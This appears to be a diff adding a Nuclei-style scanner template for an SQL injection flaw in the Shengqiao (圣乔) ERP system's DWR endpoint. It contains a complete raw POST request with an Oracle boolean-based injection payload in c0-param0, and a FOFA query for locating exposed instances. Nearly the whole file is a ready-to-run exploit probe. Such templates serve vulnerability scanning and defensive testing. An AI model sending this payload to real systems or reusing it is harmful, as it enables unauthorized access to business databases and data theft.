@@ -1,0 +1,58 @@
+id: poc-muy32zm5r0glt98s
+info:
+  name: 圣乔ERP系统NamedParameterSingleRowQueryConvertor.queryForString.dwr存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/muy32zm5r0glt98s'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: muy32zm5r0glt98s
+    fofa: app="圣乔-ERP系统"
+http:
+- raw:
+  - 'POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+    Connection: close
+
+    Content-Length: 493
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Content-Type: text/plain
+
+    Priority: u=0
+
+
+    callCount=1
+
+    page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor
+
+    httpSessionId=47CA299619667847F1BB450454E6C2D4
+
+    scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275
+
+    c0-scriptName=NamedParameterSingleRowQueryConvertor
+
+    c0-methodName=queryForString
+
+    c0-id=0
+
+    c0-param0=(SELECT CHR(113)||CHR(98)||CHR(118)||CHR(118)||CHR(113)||(CASE WHEN (7393=7393) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||CHR(113)||CHR(106)||CHR(120)||CHR(107)||CHR(113) FROM DUAL)
+
+    c0-param1=Object_Object:{}
+
+    batchId=0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
